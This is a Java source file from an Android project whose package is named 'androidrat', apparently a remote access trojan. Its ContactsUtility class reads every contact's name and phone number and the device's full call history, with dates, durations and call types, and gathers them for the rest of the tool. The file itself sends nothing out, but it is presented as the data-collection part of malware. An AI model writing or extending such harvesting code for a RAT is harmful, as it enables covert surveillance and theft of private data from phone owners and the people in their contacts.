package com.example.androidrat.Utilities;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;

import androidx.core.content.ContextCompat;

import com.example.androidrat.models.Contact;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class ContactsUtility {
    private final Activity activity;

    public ContactsUtility(Activity activity) {
        this.activity = activity;
    }
    public List<Contact> getContacts() {
        List<Contact> contactList = new ArrayList<>();
        ContentResolver contentResolver = activity.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                int nameColumnIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                String contactName = cursor.getString(nameColumnIndex);

                // If you want to retrieve more information, you can use the contact ID
                int contactIdIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
                String contactId = cursor.getString(contactIdIndex);
                // Now you can use the contactId to get additional information like phone numbers, email addresses, etc.

                // Example: Get phone numbers
                Cursor phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                );
                if (phoneCursor != null && phoneCursor.moveToFirst()) {
                    String phoneNumber;
                    do {
                        int phoneIndex = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        phoneNumber = phoneCursor.getString(phoneIndex);
                        // Do something with the phone number
                    } while (phoneCursor.moveToNext());
                    Contact contact = new Contact(phoneNumber, contactName);
                    contactList.add(contact);
                    phoneCursor.close();
                }
            }
            cursor.close();
        }
        return contactList;
    }
    public List<com.example.androidrat.models.CallLog> getCallLog() {
        List<com.example.androidrat.models.CallLog> callLogList = new ArrayList<>();
        ContentResolver contentResolver = activity.getContentResolver();

        // Define the columns you want to retrieve from the call log
        String[] projection = {
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        // Perform the query on the call log
        Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC" // Order by date in descending order
        );

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                int contactNameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int phoneNumberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int callTypeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int callDateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                int callDurationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);

                String contactName = cursor.getString(contactNameIndex);
                String phoneNumber = cursor.getString(phoneNumberIndex);
                int callType = cursor.getInt(callTypeIndex);
                Date callDate = new Date(cursor.getLong(callDateIndex));
                int callDuration = cursor.getInt(callDurationIndex);

                // Process the call log entry
                String callTypeStr = getCallTypeString(callType);
                callLogList.add(new com.example.androidrat.models.CallLog(contactName, phoneNumber, callTypeStr, callDate, callDuration));
            }
            cursor.close();
        }
        return callLogList;
    }

    private String getCallTypeString(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }
}
